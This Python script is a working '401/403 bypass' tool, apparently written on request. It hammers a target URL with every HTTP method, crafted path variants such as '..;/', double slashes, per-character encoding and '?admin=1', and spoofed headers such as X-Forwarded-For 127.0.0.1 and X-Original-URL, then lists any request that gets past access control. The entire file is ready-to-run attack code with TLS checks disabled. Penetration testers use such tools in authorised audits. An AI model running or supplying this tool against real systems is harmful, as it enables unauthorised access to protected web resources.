import requests
import argparse
import sys
import copy
from urllib.parse import urlparse

# Disable SSL warnings for research environments
requests.packages.urllib3.disable_warnings()

class Bypasser:
    def __init__(self, target_url):
        self.parsed = urlparse(target_url)
        self.base_url = f"{self.parsed.scheme}://{self.parsed.netloc}"
        self.path = self.parsed.path if self.parsed.path else "/"
        self.methods = ["GET", "POST", "PUT", "DELETE", "PATCH", "HEAD", "OPTIONS"]
        self.successes = []
        self.session = requests.Session()
        self.session.verify = False

    def get_path_variations(self):
        path = self.path
        if not path.startswith('/'): path = '/' + path
        parts = list(filter(None, path.split('/')))
        
        v = set([path])
        # 1. Case Variations
        v.add(path.upper())
        v.add(path.lower())
        v.add(path.title())
        
        # 2. Basic Path Manipulation
        variations = [
            path + "/", path + "/.", "/." + path, 
            path + "..;/", path + "/..;/", 
            path.replace("/", "//"), path.replace("/", "/./"),
            path + ".json", path + ".php", path + ".html",
            path + "?", path + "??", path + "#", path + "%20"
        ]
        v.update(variations)

        # 3. Dynamic Encoding (The "Dynamic" part you asked for)
        # Encodes each character in the path one by one
        for i in range(len(path)):
            if path[i] == '/': continue
            encoded_char = f"%{ord(path[i]):02x}"
            v.add(path[:i] + encoded_char + path[i+1:])
            
        # 4. Unicode Obfuscation
        v.add(path.replace(".", "%u002e"))
        
        # 5. Query Parameter Fuzzing
        queries = ["?method=json", "?format=json", "?_method=GET", "?debug=true", "?admin=1", "?admin=true"]
        for q in queries:
            v.add(path + q)

        return list(v)

    def get_headers(self):
        return [
            {"X-Forwarded-For": "127.0.0.1"},
            {"X-Forwarded-Host": "localhost"},
            {"X-Host": "127.0.0.1"},
            {"X-Original-URL": self.path},
            {"X-Rewrite-URL": self.path},
            {"X-Remote-IP": "127.0.0.1"},
            {"X-Client-IP": "127.0.0.1"},
            {"X-Custom-IP-Authorization": "127.0.0.1"},
            {"X-Originating-IP": "127.0.0.1"},
            {"X-Forwarded-Proto": "http"},
            {"X-Original-Method": "GET"},
            {"Referer": self.base_url + self.path}
        ]

    def run(self):
        print(f"[*] Auditing: {self.base_url}{self.path}")
        print(f"{'METHOD':<8} | {'STATUS':<6} | {'SIZE':<8} | {'PAYLOAD'}")
        print("-" * 80)

        path_variations = self.get_path_variations()
        headers_to_test = self.get_headers()

        for method in self.methods:
            for p_var in path_variations:
                full_url = self.base_url + p_var
                
                try:
                    # --- Step 1: Establish Baseline ---
                    base_res = self.session.request(method, full_url, timeout=5, allow_redirects=False)
                    base_status = base_res.status_code
                    base_size = len(base_res.content)
                    
                    print(f"{method:<8} | {base_status:<6} | {base_size:<8} | {p_var}")
                    
                    if base_status in [200, 201, 204]:
                        self.successes.append(f"Method: {method} | Path: {p_var} (Direct Access)")

                    # --- Step 2: Header Fuzzing (Only if Baseline is 401/403/405) ---
                    if base_status in [401, 403, 405]:
                        for h_payload in headers_to_test:
                            h_res = self.session.request(method, full_url, headers=h_payload, timeout=5, allow_redirects=False)
                            
                            # Check if the header changed the outcome
                            if h_res.status_code != base_status:
                                if h_res.status_code in [200, 201, 204]:
                                    print(f"  [!] BYPASS FOUND: {h_payload}")
                                    self.successes.append(f"Method: {method} | Path: {p_var} | Header: {h_payload}")
                except Exception as e:
                    continue

    def print_summary(self):
        print("\n" + "="*60)
        print("                 FINAL BYPASS REPORT")
        print("="*60)
        if not self.successes:
            print("[-] No successful bypasses identified.")
        else:
            # Use set to remove duplicates if any
            for report in sorted(set(self.successes)):
                print(f"[+] {report}")
        print("="*60)

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Professional 401/403 Bypass Tool")
    parser.add_argument("-u", "--url", required=True, help="Target URL")
    args = parser.parse_args()

    auditor = Bypasser(args.url)
    auditor.run()
    auditor.print_summary()
